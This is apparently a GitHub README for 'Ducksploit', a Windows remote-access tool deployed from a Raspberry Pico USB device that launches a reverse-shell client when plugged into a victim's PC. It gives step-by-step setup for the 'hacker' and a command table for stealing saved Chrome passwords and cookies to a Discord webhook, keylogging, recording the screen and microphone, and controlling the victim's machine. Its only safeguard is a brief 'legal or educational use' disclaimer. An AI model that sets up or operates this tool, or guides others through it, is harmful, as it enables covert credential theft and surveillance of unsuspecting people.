<img src="https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/dsbanner.png" alt="banner"/>

![](https://img.shields.io/badge/Version-1.0.7-red?style=for-the-badge) ![](https://img.shields.io/github/stars/canarddu38/DUCKSPLOIT?style=for-the-badge) ![](https://img.shields.io/github/issues/canarddu38/DUCKSPLOIT?style=for-the-badge) ![](	https://img.shields.io/github/forks/canarddu38/DUCKSPLOIT?style=for-the-badge) ![](https://img.shields.io/github/license/canarddu38/DUCKSPLOIT?style=for-the-badge) ![](https://img.shields.io/badge/Windows-blue?style=for-the-badge)

> Awsome crossbreed of batch and python on Windows ♥
 <center>
<img src="https://camo.githubusercontent.com/7f611eb7fa49f2b2cf006f5164f75e1b4fafd3d967bfe0b00b717d3a10ebd44d/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f527562792d4343333432443f7374796c653d666f722d7468652d6261646765266c6f676f3d72756279266c6f676f436f6c6f723d7768697465" alt="ruby" width="100"/><img src="https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/windows-10.png?raw=true" alt="win10" widith="100" height="100"/>
</center>

## Install Ducksploit

#### Hacker
###### setup raspberry pico (hacker)
1. Download https://github.com/canarddu38/DUCKSPLOIT/archive/root.zip
2. Extract downloaded zip file
3. Plugg your raspberry pico on your PC with the BOOTSEL button
   [![picobootbutton](https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/picoboot.png?raw=true "picobootbutton")](https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/picoboot.png?raw=true "picobootbutton")
4. Move CircuitPython.uf2 file in the E:\ or F:\ <-- usb port (port of your pico)
   now your raspberry pico gonna leave usb port and reconnec with CIRCUITPY name
5. Erase all the content of your raspberry pico and copy all the extracted repo folder into him
6. Write myip.txt and write your own IP
7. Now your raspberry pico is full configured , unplugg your pico and done!

###### setup ducksploit commands (hacker)

1. Download https://github.com/canarddu38/DUCKSPLOIT/archive/root.zip
2. Extract downloaded zip file
3. If python is not installed, launch 'installpython.bat' or download at https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe
4. launch setup.bat       ###MUST BE RUN AS ADMINISTRATOR###
5. wait till installation is finished
7. Ducksploit is now installed on your PC :smile:
8. Type 'ds' in the cmd
9. Wait victim's connection using 'wait' command
10. Have fun with ducksploit hacking commands (type help to get commands list)

⚠️ WHEN EXPLOIT/SCRIPT IS RUNNING, TYPE ON 'ESC' KEY ⚠️

#### Victim
Just plugg the raspberry pico in your pc (or hacker can do also)
That will start automaticaly the client of the reverse shell

:warning: Ducksploit is made for legal use or educational use (then, we are not responsible for any crimes committed by our users):warning:

## Uninstall Ducksploit (victim)

1. type 'ds uninstall' in cmd
2. Done  :smile:

## SUPPORT
support us with     
<noscript><a href="https://www.paypal.com/paypalme/Canarddu38"><img alt="Donate 👍 using Paypal" src="https://www.paypalobjects.com/webstatic/mktg/Logo/pp-logo-200px.png"></a></noscript>        or        <noscript><a href="https://www.patreon.com/ducksploit"><img alt="Donate 👍 using Patreon" src="https://forum.cwowd.com/uploads/default/original/3X/6/d/6d1cdda143cc46667d87659d64d15a869a9b6139.png" width="100" height="100"></a></noscript>

## **Commands**
<img src="https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/mindmap.png?raw=true">




#### Launch
| Command | Usage | Result |
| ------------- | ------------- | ------------- |
| wait    | wait | wait your victim's connection |


#### Account
| Command | Usage    | Result |
| ------------- | ------------- | ------------- |
| info | info | view all your account's infos |

#### Exploits
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| stealpwds | stealpwds (discord webhook url) | steal all saved chrome passwords of your victim and send them into a discord webhook |
| stealcookies  | stealcookies (discord webhook url) | steal all saved chrome cookies of your victim and send them into a discord webhook |
| open  | open (applicationname.exe) | open mensioned application |
| recordscreen  | recordscreen (time in second) | record victim's screen durring amount of time |
| recordmicro  | recordmicro (time in second) | record victim's micro durring amount of time |

## ⚠️ To get your victim's keylogs, go on 'http://{ip of your victim}:8013/keylogger/' ⚠️

#### Mouse
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| mouseclick | mouseclick [left, right, middle] | make the victim click the mensionned button |
| mousemove | mousemove (x) (y) | move the victim's cursor by x and y pixels |
| locatemouse | locatemouse | get the victim's cursor current locations |

#### Alert Window
| Command  | Usage | Result |
| ------------- | ------------- | ------------- |
| msg | msg (title) (line1) (line2) | create an alertbox and send it on the vitim's pc with a title and 2 lines (if -file set line1 to createfile command content)

#### Troll
| Command | Usage | Result |
| ------------- | ------------- | ------------- |
| skull   | skull | spam cmds with skull and crossbones |

#### Mysc 
| Command      | Usage       | Result                            |
|--------------|-------------|-----------------------------------|
| uninstall    | uninstall   | uninstall ducksploit              |
| update       | update      | update ducksploit                 |
| credits      | credits     | view ducksploit's credits         |
| help         | help        | getting the list of all commands  |
| shutdown     | shutdown    | make the victim's pc shutdown     |
| reboot       | reboot      | make the victim's pc reboot       |
| closesession | closesesion | make the victim's session close   |
